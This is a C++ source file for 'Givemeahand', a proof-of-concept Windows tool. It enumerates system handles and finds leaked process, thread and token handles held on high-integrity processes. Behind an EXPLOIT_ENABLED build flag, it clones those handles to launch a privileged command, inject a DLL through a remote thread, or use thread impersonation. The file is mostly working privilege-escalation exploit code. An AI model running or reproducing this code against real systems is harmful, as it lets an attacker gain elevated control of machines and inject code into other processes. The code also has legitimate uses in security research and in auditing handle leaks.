// Givemeahand.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <TlHelp32.h>
#include <map>
#include <resource.h>
#include <vector>

#include "support.h"
#include "utils.h"
#include "Givemeahand.h"

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

//https://stackoverflow.com/questions/865668/parsing-command-line-arguments-in-c
map<wstring, wstring> ParseArguments(int argc, wchar_t* argv[])
{
	map<wstring, wstring> args;
	for (int i = 1; i < argc; i++) {
		if (argv[i][0] == '-') {
			const wstring key = argv[i];
			wstring value = L"";
			if (i + 1 < argc && argv[i + 1][0] != '-') {
				value = wstring(argv[i + 1]);
				i++;
			}
			args[key] = value;
		}
	}
	return args;
}

void PrintUsage()
{
	cout << "Givemeahand: A PoC tool for exploiting leaked process and thread handles\n"
		"Heavily inspired by:"
		"\thttps://aptw.tf/2022/02/10/leaked-handle-hunting.html\n"
		"\thttp://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/\n"
		"\n"
		"Example usage:\n"
#ifdef EXPLOIT_ENABLED
		"\t.\\Givemeahand --cmd \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe\"\n"
		"\t.\\Givemeahand --dll \"C:\\Users\\user\\payload.dll\"  (PROCESS_CREATE_THREAD path)\n"
#else
		"\t.\\Givemeahand  (detection only — rebuild with EXPLOIT_ENABLED for exploit paths)\n"
#endif
		;
}

void printHandleInfo(SYSTEM_HANDLE_TABLE_ENTRY_INFO& handle, const DWORD& integrityLevel)
{
	std::wcout << "[*] Process: " << GetProcName(handle.UniqueProcessId) << " (" << std::dec << handle.UniqueProcessId << ")" << "\n\t"
		<< "|_ Handle value: 0x" << std::hex << static_cast<uint64_t>(handle.HandleValue) << "\n\t"
		<< "|_ Object address: 0x" << std::hex << reinterpret_cast<uint64_t>(handle.Object) << "\n\t"
		<< "|_ Object type: 0x" << std::hex << static_cast<uint32_t>(handle.ObjectTypeNumber) << "\n\t"
		<< "|_ Access granted: 0x" << std::hex << static_cast<uint32_t>(handle.GrantedAccess) << "\n\t"
		<< "|_ Integrity level: 0x" << std::hex << static_cast<uint32_t>(integrityLevel) << std::endl;
}

int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
{
	map<wstring, wstring> args = ParseArguments(argc, argv);

	if (args.count(L"-h") || args.count(L"--help")) {
		PrintUsage();
		return 0;
	}

	NTSTATUS queryInfoStatus = 0;
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
	PSYSTEM_HANDLE_INFORMATION tempHandleInfo = nullptr;
	size_t handleInfoSize = 0x10000;
	auto handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	if (handleInfo == NULL) return 1;

	std::map<HANDLE, DWORD> mHandleId;

	wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0));
	PROCESSENTRY32W processEntry = { 0 };
	THREADENTRY32 threadEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	threadEntry.dwSize = sizeof(THREADENTRY32);
	vector<DWORD> pids = {};

	std::cout << "[*] Populating tid2pid map ..." << endl;
	map<DWORD, DWORD> tid2pid = {};

	auto status = Thread32First(snapshot.get(), &threadEntry);
	do
	{
		tid2pid[threadEntry.th32ThreadID] = threadEntry.th32OwnerProcessID;
	} while (Thread32Next(snapshot.get(), &threadEntry));


	std::cout << "[*] Populating handleInfo ..." << endl;

	while (queryInfoStatus = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SystemHandleInformation, //0x10
		handleInfo,
		static_cast<ULONG>(handleInfoSize),
		NULL
	) == 0xC0000004)
	{
		tempHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
		if (tempHandleInfo == NULL) return 1;
		else handleInfo = tempHandleInfo;
	}

	std::cout << "[*] Looking for vulnerable handles ...\n";
	std::map<uint64_t, HANDLE> mAddressHandle;
	std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO> vSysHandle;

	for (uint32_t i = 0; i < handleInfo->HandleCount; i++)
	{
		auto handle = handleInfo->Handles[i];
		switch (handle.ObjectTypeNumber)
		{
		case OB_TYPE_INDEX_PROCESS:
		{
			if ((handle.GrantedAccess == PROCESS_ALL_ACCESS ||
				handle.GrantedAccess & PROCESS_CREATE_PROCESS ||
				handle.GrantedAccess & PROCESS_CREATE_THREAD ||
				handle.GrantedAccess & PROCESS_DUP_HANDLE ||
				handle.GrantedAccess & PROCESS_VM_OPERATION ||
				handle.GrantedAccess & PROCESS_VM_WRITE)) {
				HANDLE clHandle;
				try
				{
					if (CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
						DWORD integrityLevel = GetTargetIntegrityLevel(clHandle);
						// If we could clone the handle but access is denied,
						// we consider the integrityLevel to be greater than ours ...
						if (integrityLevel >= SECURITY_MANDATORY_HIGH_RID || GetLastError() == ERROR_ACCESS_DENIED)
						{
							vSysHandle.push_back(handle);
							printHandleInfo(handle, integrityLevel);
#ifdef EXPLOIT_ENABLED
							if (handle.GrantedAccess & PROCESS_CREATE_PROCESS && args.count(L"--cmd")) {
								HANDLE clHandle;
								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
									std::cerr << "[-] CloneHandle failed";
								}
								DWORD privPid = CreatePrivProc(
									&clHandle,
									(WCHAR*)args.find(L"--cmd")->second.c_str());
								if (privPid == 0) {
									std::cerr << "[-] CreatePrivProc failed";
								}
								else {
									std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
									return 0;
								}
							}
							else if (handle.GrantedAccess & PROCESS_DUP_HANDLE && args.count(L"--cmd")) {
								HANDLE clHandle;
								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
									std::cerr << "[-] CloneHandle failed\n";
								}
								else {
									DWORD privPid = ExploitDupHandle(
										clHandle,
										(WCHAR*)args.find(L"--cmd")->second.c_str());
									CloseHandle(clHandle);
									if (privPid == 0) {
										std::cerr << "[-] ExploitDupHandle failed\n";
									}
									else {
										std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
										return 0;
									}
								}
							}
							else if (handle.GrantedAccess & PROCESS_CREATE_THREAD && args.count(L"--dll")) {
								HANDLE clHandle;
								if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
									std::cerr << "[-] CloneHandle failed\n";
								}
								else {
									DWORD tid = ExploitCreateThread(
										clHandle,
										(WCHAR*)args.find(L"--dll")->second.c_str());
									CloseHandle(clHandle);
									if (tid == 0) {
										std::cerr << "[-] ExploitCreateThread failed\n";
									}
									else {
										std::cerr << "[!] DLL injected via remote thread TID " << tid << "\n";
										return 0;
									}
								}
							}
#endif // EXPLOIT_ENABLED
						}
					}
					CloseHandle(clHandle);
				}
				catch (const std::exception&)
				{
					continue;
				}
			}
			break;
		}
		case OB_TYPE_INDEX_THREAD:
		{
			//mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.HandleValue }); // fill the ADDRESS - HANDLE map
			if ((handle.GrantedAccess == THREAD_ALL_ACCESS ||
				handle.GrantedAccess & THREAD_DIRECT_IMPERSONATION ||
				handle.GrantedAccess & THREAD_SET_CONTEXT ||
				handle.GrantedAccess & THREAD_SUSPEND_RESUME)) {
				HANDLE clHandle;
				try
				{
					if (CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
						DWORD tid = GetThreadId(clHandle);
						if (tid == 0)
						{
							continue;
						}
						auto tid2pidPair = tid2pid.find(tid);
						if (tid2pidPair == tid2pid.end())
						{
							continue;
						}
						DWORD pid = tid2pidPair->second;
						DWORD integrityLevel = GetTargetIntegrityLevel(pid);
						// If we could clone the handle but access is denied,
						// we consider the integrityLevel to be greater than ours ...
						if (integrityLevel >= SECURITY_MANDATORY_HIGH_RID || GetLastError() == ERROR_ACCESS_DENIED)
						{
							vSysHandle.push_back(handle);
							printHandleInfo(handle, integrityLevel);
#ifdef EXPLOIT_ENABLED
							if (args.count(L"--cmd")) {
								if (handle.GrantedAccess & THREAD_DIRECT_IMPERSONATION ||
									handle.GrantedAccess == THREAD_ALL_ACCESS) {
									HANDLE clHandle2;
									if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle2)) {
										std::cerr << "[-] CloneHandle failed\n";
									}
									else {
										DWORD privPid = ExploitThreadImpersonation(
											clHandle2,
											(WCHAR*)args.find(L"--cmd")->second.c_str());
										CloseHandle(clHandle2);
										if (privPid == 0) {
											std::cerr << "[-] ExploitThreadImpersonation failed\n";
										}
										else {
											std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
											return 0;
										}
									}
								}
							}
#endif // EXPLOIT_ENABLED
						}
						CloseHandle(clHandle);
					}
				}
				catch (const std::exception&)
				{
					continue;
				}
			}
			break;
		}

		case OB_TYPE_INDEX_TOKEN:
		{
			// TOKEN_IMPERSONATE / TOKEN_DUPLICATE / TOKEN_ASSIGN_PRIMARY on a
			// high-integrity token are direct LPE primitives — no process or
			// thread handle needed.
			if ((handle.GrantedAccess & TOKEN_IMPERSONATE ||
				handle.GrantedAccess & TOKEN_DUPLICATE ||
				handle.GrantedAccess & TOKEN_ASSIGN_PRIMARY)) {
				HANDLE clHandle;
				try
				{
					if (CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle)) {
						DWORD integrityLevel = GetTokenIntegrityLevel(clHandle);
						if (integrityLevel >= SECURITY_MANDATORY_HIGH_RID || GetLastError() == ERROR_ACCESS_DENIED)
						{
							vSysHandle.push_back(handle);
							printHandleInfo(handle, integrityLevel);
						}
						CloseHandle(clHandle);
					}
				}
				catch (const std::exception&)
				{
					continue;
				}
			}
			break;
		}

		default:
			continue;
		}
	}

	std::cout << "[" << (vSysHandle.size() > 0 ? "!" : "*") << "] Found " << vSysHandle.size() << " vulnerable handles\n";
	std::cout << "[*] Done\n";
	return 0;
}
